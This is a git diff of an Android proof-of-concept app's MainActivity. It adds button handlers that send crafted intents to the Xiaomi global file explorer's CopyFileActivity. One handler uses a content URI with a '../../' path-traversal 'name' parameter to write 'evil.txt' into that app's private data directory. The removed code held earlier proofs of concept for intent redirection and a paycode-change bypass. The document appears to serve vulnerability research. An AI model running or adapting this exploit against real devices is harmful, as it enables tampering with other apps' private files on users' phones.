@@ -1,8 +1,11 @@
 package com.example.pocapplication;
 
+import android.bluetooth.BluetoothAdapter;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.graphics.Color;
 import android.graphics.Typeface;
+import android.net.Uri;
 import android.os.Bundle;
 import android.text.Spannable;
 import android.text.SpannableStringBuilder;
@@ -21,6 +24,10 @@ import androidx.core.graphics.Insets;
 import androidx.core.view.ViewCompat;
 import androidx.core.view.WindowInsetsCompat;
 
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
 import java.time.format.TextStyle;
 
 public class MainActivity extends AppCompatActivity {
@@ -35,50 +42,56 @@ public class MainActivity extends AppCompatActivity {
             v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
             return insets;
         });
-        Button bypassBtn = findViewById(R.id.bypassPriBtn);
-        EditText et = findViewById(R.id.CodeEditText);
-        WebView wv = findViewById(R.id.inteneSchemeWebview);
+        Button vul1Btn = findViewById(R.id.vul1Btn);
+        TextView tv = findViewById(R.id.logTextView);
 
-        Intent i = getIntent();
-        String username = i.getStringExtra("username");
-        String password = i.getStringExtra("token");
-        TextView textView = findViewById(R.id.logTextView);
-        SpannableStringBuilder builder = new SpannableStringBuilder();
-        textView.setText("");
-        builder.append("Received Message:");
-        builder.setSpan(
-                new StyleSpan(Typeface.BOLD),
-                builder.length() - "Received Message:".length(),
-                builder.length(),
-                Spannable.SPAN_EXCLUSIVE_EXCLUSIVE
-        );
-        builder.append("\n");
-        textView.append(builder);
-        textView.append("username: "+username+", token: " + password);
+        String path = "";
+        try{
+            path = new File("content://provider/a.txt").getCanonicalPath();
+        }catch (Exception e){
+
+        }
+        tv.append(path);
+
 
         findViewById(R.id.openUnexpBtn).setOnClickListener(v -> {
-            Intent next = new Intent();
-            next.setClassName("com.example.myapplication", "com.example.myapplication.DataActivity");
-            next.putExtra("balance", 1000);
-            Intent menu = new Intent();
-            menu.setClassName("com.example.myapplication", "com.example.myapplication.MenuActivity");
-            menu.putExtra("targetIntent", next);
-            startActivity(menu);
+            String fileName = "test1.txt";
+            String content = "ATTACK!!!\n";
+            try (FileOutputStream fos = openFileOutput(fileName, MODE_PRIVATE)) {
+                fos.write(content.getBytes());
+            } catch (FileNotFoundException e ) {
+                e.printStackTrace();
+            }catch(IOException e){
+                e.printStackTrace();
+            }
+
+            Intent intent = new Intent(Intent.ACTION_SEND);
+            intent.setComponent(new ComponentName("com.mi.android.globalFileexplorer", "com.android.fileexplorer.activity.CopyFileActivity"));
+            intent.setData(Uri.parse("content://com.example.pocapplication/files/test1.txt"));
+            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+            startActivity(intent);
         });
 
-        bypassBtn.setOnClickListener(v->{
-            Intent pi = new Intent("com.example.myapplication.CHANGE_PAYCODE");
-            String code = et.getText().toString().trim();
-            pi.putExtra("payCode", code);
-            pi.putExtra("token", "123456abcd");
-            pi.setClassName("com.example.myapplication", "com.example.myapplication.PayCodeActivity");
-            startActivity(pi);
-        });
+        vul1Btn.setOnClickListener(v -> {
+            String fileName = "evil.txt";
+            String content = "ATTACK!!!\n";
+            try (FileOutputStream fos = openFileOutput(fileName, MODE_PRIVATE)) {
+                fos.write(content.getBytes());
+            } catch (FileNotFoundException e ) {
+                e.printStackTrace();
+            }catch(IOException e){
+                e.printStackTrace();
+            }
 
-        WebSettings settings = wv.getSettings();
-        settings.setAllowFileAccess(true);
-        settings.setAllowContentAccess(true);
-        wv.loadUrl("file:///android_asset/html/index.html");
+            Intent intent = new Intent();
+            intent.setAction(Intent.ACTION_SEND);
+            intent.setComponent(new ComponentName("com.mi.android.globalFileexplorer", "com.android.fileexplorer.activity.CopyFileActivity"));
+
+            intent.setData(Uri.parse("content://com.poc.fileWrite/files/evil.txt?path=" + getFilesDir() + "/evil.txt" + "&name=../../../../../../../../data/user/0/com.mi.android.globalFileexplorer/files/evil.txt" + "&size=10"));
+            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+
+            startActivity(intent);
+        });
 
 
 
